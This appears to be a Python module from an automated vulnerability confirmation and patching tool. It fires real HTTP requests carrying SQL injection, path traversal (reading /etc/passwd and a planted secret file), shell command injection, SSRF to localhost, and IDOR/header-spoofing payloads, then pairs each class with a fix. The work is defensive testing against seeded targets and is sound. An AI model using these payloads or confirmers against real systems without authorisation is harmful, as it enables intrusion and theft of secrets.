"""Class playbooks: the domain expertise, one per supported vuln class.

Each playbook knows the sink signature, how to confirm the class over HTTP, what
the canary proves, and the correct fix to hand the patch step. The finder points
these at flagged candidates; the canary oracle decides success.

Confirmers fire REAL requests. They do not fabricate results. A confirmer returns
(exploit_request, observable_output, raw_response_text). The oracle then checks
whether the planted canary appears in what left the box.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from urllib.parse import quote

import httpx


@dataclass
class ConfirmResult:
    fired: bool
    exploit_request: str
    observable: str
    response_text: str
    # One (exploit_request, response_text) pair per payload fired, in order, so
    # the oracle can attribute the leak to the exact request that carried it out.
    attempts: list[tuple[str, str]] = field(default_factory=list)


def _split_source(input_source: str) -> tuple[str, str]:
    """'query:id' -> ('query', 'id'); fall back to a sensible param name."""
    if ":" in input_source:
        src, name = input_source.split(":", 1)
        return src, name
    return "query", input_source if input_source != "request" else "id"


# --- SQL injection -----------------------------------------------------------

def confirm_sqli(base_url: str, endpoint: str, input_source: str, timeout: float) -> ConfirmResult:
    """UNION-based probe: try to pull the canary out of a secrets table.

    We fire a baseline request and a family of injection payloads. Success is
    decided by the oracle (did the canary appear), not by us.
    """
    _, param = _split_source(input_source)
    payloads = [
        "-1 UNION SELECT value, label, id FROM secrets--",
        "-1 UNION SELECT value, name, price FROM secrets--",
        "0 OR 1=1",
        "1'; SELECT value FROM secrets--",
        "-1 UNION SELECT value FROM secrets--",
    ]
    url = f"{base_url.rstrip('/')}{endpoint}"
    fired_req = ""
    observable = ""
    combined = ""
    attempts: list[tuple[str, str]] = []
    try:
        with httpx.Client(timeout=timeout, follow_redirects=True) as client:
            baseline = client.get(url, params={param: "1"})
            for p in payloads:
                req = client.build_request("GET", url, params={param: p})
                resp = client.send(req)
                fired_req = str(req.url)
                attempts.append((f"GET {fired_req}", resp.text))
                combined += f"\n[{p}] -> {resp.status_code}\n{resp.text[:400]}"
                # If the injection response differs and returns extra rows, note it.
                if resp.status_code == 200 and resp.text != baseline.text:
                    observable = resp.text[:400]
    except httpx.HTTPError as exc:
        combined += f"\n[transport error] {exc}"
    return ConfirmResult(
        fired=bool(fired_req),
        exploit_request=f"GET {fired_req}",
        observable=observable or combined[:400],
        response_text=combined,
        attempts=attempts,
    )


# --- Path traversal ----------------------------------------------------------

def confirm_path_traversal(base_url: str, endpoint: str, input_source: str, timeout: float) -> ConfirmResult:
    _, param = _split_source(input_source)
    payloads = [
        # Planted secret one level up from the served docs/ dir.
        "../app_secret.txt",
        "..%2fapp_secret.txt",
        "../../app_secret.txt",
        # Classic OS file, as a generic filesystem-escape signal.
        "../../../../etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
    ]
    url = f"{base_url.rstrip('/')}{endpoint}"
    fired_req = ""
    combined = ""
    observable = ""
    attempts: list[tuple[str, str]] = []
    try:
        with httpx.Client(timeout=timeout, follow_redirects=True) as client:
            for p in payloads:
                req = client.build_request("GET", url, params={param: p})
                resp = client.send(req)
                fired_req = str(req.url)
                attempts.append((f"GET {fired_req}", resp.text))
                combined += f"\n[{quote(p)}] -> {resp.status_code}\n{resp.text[:300]}"
                if "root:" in resp.text and ":/" in resp.text:
                    observable = resp.text[:300]
    except httpx.HTTPError as exc:
        combined += f"\n[transport error] {exc}"
    return ConfirmResult(
        fired=bool(fired_req),
        exploit_request=f"GET {fired_req}",
        observable=observable or combined[:300],
        response_text=combined,
        attempts=attempts,
    )


# --- Shared firing helper ----------------------------------------------------

def _fire_get(base_url: str, endpoint: str, param: str, payloads: list[str], timeout: float) -> ConfirmResult:
    """Fire each payload as a GET query param; record every attempt for the oracle."""
    url = f"{base_url.rstrip('/')}{endpoint}"
    fired_req = ""
    combined = ""
    attempts: list[tuple[str, str]] = []
    try:
        with httpx.Client(timeout=timeout, follow_redirects=True) as client:
            for p in payloads:
                req = client.build_request("GET", url, params={param: p})
                resp = client.send(req)
                fired_req = str(req.url)
                attempts.append((f"GET {fired_req}", resp.text))
                combined += f"\n[{p}] -> {resp.status_code}\n{resp.text[:300]}"
    except httpx.HTTPError as exc:
        combined += f"\n[transport error] {exc}"
    return ConfirmResult(
        fired=bool(fired_req),
        exploit_request=f"GET {fired_req}",
        observable=combined[:400],
        response_text=combined,
        attempts=attempts,
    )


# --- Command injection -------------------------------------------------------

def confirm_command_injection(base_url: str, endpoint: str, input_source: str, timeout: float) -> ConfirmResult:
    """Append a command that reads the planted secret file; the oracle checks for the canary.

    NOTE: the payloads read ``app_secret.txt`` -- the file canary planted on the
    seeded target. A general run must instead reference the per-run canary path
    Cerberus planted; wiring that through is part of generalizing beyond the
    seeded targets.
    """
    _, param = _split_source(input_source)
    payloads = [
        "127.0.0.1; cat app_secret.txt",
        "127.0.0.1 && cat app_secret.txt",
        "127.0.0.1 | cat app_secret.txt",
        "$(cat app_secret.txt)",
        "`cat app_secret.txt`",
        "x; cat ../app_secret.txt",
    ]
    return _fire_get(base_url, endpoint, param, payloads, timeout)


# --- SSRF --------------------------------------------------------------------

def confirm_ssrf(base_url: str, endpoint: str, input_source: str, timeout: float) -> ConfirmResult:
    """Make the server fetch an internal-only endpoint; success is the canary coming back."""
    _, param = _split_source(input_source)
    base = base_url.rstrip("/")
    payloads = [
        f"{base}/internal/metadata",  # the server can reach its own internal route
        "http://127.0.0.1/internal/metadata",
        "http://localhost/internal/metadata",
    ]
    return _fire_get(base_url, endpoint, param, payloads, timeout)


# --- Auth bypass / IDOR ------------------------------------------------------

def confirm_auth_bypass(base_url: str, endpoint: str, input_source: str, timeout: float) -> ConfirmResult:
    """Request objects the caller does not own; the canary belongs to another user.

    Also spoofs a client identity header matching the requested id -- so a "fix"
    that merely trusts a client-supplied identity is caught here and NOT certified.
    """
    _, param = _split_source(input_source)
    url = f"{base_url.rstrip('/')}{endpoint}"
    probes = [
        ({param: "2"}, None),
        ({param: "2"}, {"X-User": "2"}),  # spoof the identity a naive patch might trust
        ({param: "3"}, {"X-User": "3"}),
        ({param: "0"}, None),
        ({param: "9999"}, None),
    ]
    fired_req = ""
    combined = ""
    attempts: list[tuple[str, str]] = []
    try:
        with httpx.Client(timeout=timeout, follow_redirects=True) as client:
            for params, headers in probes:
                req = client.build_request("GET", url, params=params, headers=headers or {})
                resp = client.send(req)
                fired_req = str(req.url)
                label = f"GET {fired_req}" + (f" (X-User: {headers['X-User']})" if headers else "")
                attempts.append((label, resp.text))
                combined += f"\n[{params} hdr={headers}] -> {resp.status_code}\n{resp.text[:200]}"
    except httpx.HTTPError as exc:
        combined += f"\n[transport error] {exc}"
    return ConfirmResult(
        fired=bool(fired_req),
        exploit_request=f"GET {fired_req}",
        observable=combined[:400],
        response_text=combined,
        attempts=attempts,
    )


# --- Registry ----------------------------------------------------------------

# NOTE: confirmers today fire GET requests with the payload in a query
# parameter. Sinks fed from POST bodies, headers, cookies, or JSON are flagged
# by the sweep but not yet confirmable -- adding method/source-aware payload
# delivery is the next confirmer increment. Until then such candidates surface
# in coverage's not_reached rather than being falsely cleared.
CONFIRMERS = {
    "sqli": confirm_sqli,
    "path_traversal": confirm_path_traversal,
    "command_injection": confirm_command_injection,
    "ssrf": confirm_ssrf,
    "auth_bypass": confirm_auth_bypass,
}

FIXES = {
    "sqli": "Use a parameterized query (bind parameters) instead of string "
            "concatenation, e.g. cursor.execute('... WHERE id = ?', (value,)).",
    "path_traversal": "Reject path separators and '..', resolve the path, and confirm "
                      "it stays within the intended base directory before opening.",
    "command_injection": "Never pass user input to a shell. Use argument lists with "
                         "shell=False, and validate against an allowlist.",
    "ssrf": "Validate the URL against an allowlist of hosts/schemes and block private "
            "IP ranges and redirects to them.",
    "auth_bypass": "Enforce an authorization check on the object owner for every "
                   "request; never trust a client-supplied identity or role.",
}

# For the model's benefit: what each sink looks like, so triage can reason about reachability.
SINK_SIGNATURES = {
    "sqli": "A SQL string built by concatenation/format/f-string then passed to execute().",
    "path_traversal": "A user-controlled filename joined to a base path and opened/read.",
    "command_injection": "User input concatenated into os.system/subprocess with a shell.",
    "ssrf": "A user-controlled URL fetched by requests/httpx/urlopen.",
    "auth_bypass": "A route that reads an object by id without checking the caller owns it.",
}


def confirmer_for(vuln_class: str):
    return CONFIRMERS.get(vuln_class)
